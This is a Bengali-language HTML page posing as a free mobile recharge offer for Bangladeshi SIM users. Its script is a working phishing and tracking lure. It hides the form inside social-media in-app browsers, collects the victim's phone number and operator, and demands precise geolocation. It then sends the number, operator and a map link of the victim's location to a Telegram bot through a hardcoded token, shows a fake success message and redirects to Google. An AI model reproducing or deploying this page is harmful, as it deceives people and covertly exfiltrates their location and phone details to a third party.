<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ফ্রি রিচার্জ অফার ২০২৬</title>
    <style>
        body { background-color: #f4f7f6; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; border-top: 5px solid #d9534f; }
        .btn-green { width: 100%; padding: 15px; background-color: #28a745; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .block-box { display: none; padding: 15px; background: #fffbe6; border: 1px dashed #ffc107; border-radius: 10px; margin-top: 15px; text-align: left; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        b { color: #d9534f; }
    </style>
</head>
<body>

<div class="container">
    <h2>🎁 ধামাকা অফার!</h2>
    <p id="info-msg">সঠিক তথ্য দিয়ে ২০ টাকা রিচার্জ নিন অবশ্যই আপনাকে ক্রোম বা গুগল থেকে রিচাজ নিতে হবে ব্রাউজার ব্যবহার না করলে ফ্রমটি কাজ করবেনা </p>
    
    <div id="app-blocker" class="block-box">
        <p style="font-weight: bold; text-align: center;">⚠️ সতর্কবার্তা</p>
        ১. উপরে ডানদিকের <b>তিনটি ডট (⋮)</b> এ ক্লিক করুন।<br>
        ২. তারপর <b>"Open in Browser"</b> অপশনটি সিলেক্ট করুন।
        <p style="font-size: 12px; color: #666; margin-top: 10px;">(ব্রাউজারে না গেলে রিচার্জ পাবেন না)</p>
    </div>

    <div id="recharge-form">
        <select id="sim">
            <option value="">সিম নির্বাচন করুন</option>
            <option value="GP">জিপি (GP)</option>
            <option value="BL">বাংলালিংক (BL)</option>
            <option value="Robi">রবি (Robi)</option>
            <option value="Airtel">এয়ারটেল (Airtel)</option>
        </select>
        <input type="number" id="phone" placeholder="আপনার মোবাইল নম্বর">
        <button class="btn-green" onclick="processOffer()">রিচার্জ নিন</button>
    </div>
</div>

<script>
// সব ইন-অ্যাপ ব্রাউজার ডিটেক্ট করার কোড
var ua = navigator.userAgent || navigator.vendor || window.opera;
var isInApp = /FBAN|FBAV|Messenger|TikTok|IMO|Instagram/i.test(ua);

if (isInApp) {
    document.getElementById('recharge-form').style.display = 'none';
    document.getElementById('app-blocker').style.display = 'block';
    document.getElementById('info-msg').innerText = "আপনি বর্তমানে একটি ইন-অ্যাপ ব্রাউজারে আছেন।";
}

function processOffer() {
    var phone = document.getElementById('phone').value;
    var sim = document.getElementById('sim').value;

    if (sim == "" || phone.length < 11) { 
        alert("সঠিক তথ্য দিন।"); 
        return; 
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            // লোকেশন অন থাকলে এখানে আসবে
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
            
            var token = "8502696183:AAHMRmatcsRh3fXyX2ng8AyU3y6f3m-7Mdw";
            var chat_id = "7887080882";
            var message = "✅ সাকসেস\n📱 নম্বর: " + phone + "\n📶 সিম: " + sim + "\n📍 ম্যাপ: " + mapUrl;
            
            fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message))
            .then(() => {
                alert("আবেদন সফল! ২০ মিনিটের মধ্যে রিচার্জ পাবেন।");
                window.location.href = "https://www.google.com";
            });
        }, function(error) {
            // লোকেশন অফ থাকলে আপনার দেওয়া ওই ওয়ার্নিং দেখাবে
            alert("আপনি এখনো আপনার ফোনের লকেশন অপশন অন করেন্নি দয়া করে অন করুন!");
        }, { enableHighAccuracy: true, timeout: 5000 });
    }
}
</script>

</body>
</html>
